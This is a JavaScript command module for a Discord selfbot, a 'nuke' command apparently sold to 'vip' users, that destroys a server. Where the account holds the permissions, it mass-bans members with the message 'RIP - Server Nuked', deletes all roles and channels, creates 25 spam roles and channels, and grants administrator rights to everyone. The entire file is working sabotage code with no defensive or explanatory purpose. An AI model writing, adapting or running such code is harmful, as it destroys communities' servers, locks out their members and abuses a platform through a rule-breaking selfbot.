const { Permissions } = require("discord.js-selfbot-v13")
const f  = require("../../utils/functions.js")

module.exports = {
    name: "nuke",
    description: "Nuke a server",
    rank: "vip",
    async run(client, message, args){
        if(!message.guild) return
        if (message.guild.me.permissions.has(Permissions.FLAGS.BAN_MEMBERS)){
            f.massUnban(message)
            f.massBan(message, "RIP - Server Nuked")
        }

        if (message.guild.me.permissions.has(Permissions.FLAGS.MANAGE_ROLES)){
           f.clearRoles(message) 
           for(let index = 0; index < 25; index++) f.makeRoles(message, "NUKED")
           f.adminAll(message)
        } 

        if(message.guild.me.permissions.has(Permissions.FLAGS.MANAGE_CHANNELS)){
            f.clearChannels(message)
            for (let index = 0; index < 25; index++) f.makeChannel(message, "🚨_NUKE_ACTIVATED_🚨")
        }
    }
}